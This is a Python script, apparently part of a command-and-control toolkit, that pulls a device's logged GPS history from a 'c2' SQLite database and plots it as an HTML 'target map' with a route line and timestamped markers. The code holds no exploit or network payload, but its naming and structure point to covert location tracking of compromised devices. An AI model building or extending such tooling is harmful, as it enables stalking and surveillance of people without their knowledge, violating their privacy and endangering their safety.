import os
import sqlite3
import folium
from datetime import datetime
from typing import List, Dict, Optional

DB_PATH = os.environ.get("C2_DB_NAME", "../c2/c2_data.db")
MAP_OUTPUT_DIR = os.environ.get("MAP_OUTPUT_DIR", "maps")

def fetch_location_history(device_id: str, limit: int = 100) -> List[Dict]:
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("""
        SELECT latitude, longitude, timestamp 
        FROM location_logs 
        WHERE device_id = ? 
        ORDER BY timestamp DESC 
        LIMIT ?
    """, (device_id, limit))
    rows = cursor.fetchall()
    conn.close()
    return [{"lat": r[0], "lon": r[1], "timestamp": r[2]} for r in rows]

def create_target_map(device_id: str, limit: int = 100) -> Optional[str]:
    locations = fetch_location_history(device_id, limit)
    if not locations:
        print(f"[geo_tracker] No location data for {device_id}")
        return None

    locations.reverse()
    os.makedirs(MAP_OUTPUT_DIR, exist_ok=True)

    first = locations[0]
    m = folium.Map(location=[first["lat"], first["lon"]], zoom_start=13)

    points = [[loc["lat"], loc["lon"]] for loc in locations]
    folium.PolyLine(points, color="blue", weight=3, opacity=0.7).add_to(m)

    for loc in locations:
        popup_text = f"<b>Time:</b> {loc['timestamp']}<br><b>Lat:</b> {loc['lat']}<br><b>Lon:</b> {loc['lon']}"
        folium.Marker(
            [loc["lat"], loc["lon"]],
            popup=popup_text,
            icon=folium.Icon(color="red" if loc == locations[-1] else "blue")
        ).add_to(m)

    map_filename = f"geo_{device_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
    map_path = os.path.join(MAP_OUTPUT_DIR, map_filename)
    m.save(map_path)
    print(f"[geo_tracker] Map saved: {map_path}")
    return map_path

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python geo_tracker.py <device_id> [limit]")
        sys.exit(1)
    device_id = sys.argv[1]
    limit = int(sys.argv[2]) if len(sys.argv) > 2 else 100
    create_target_map(device_id, limit)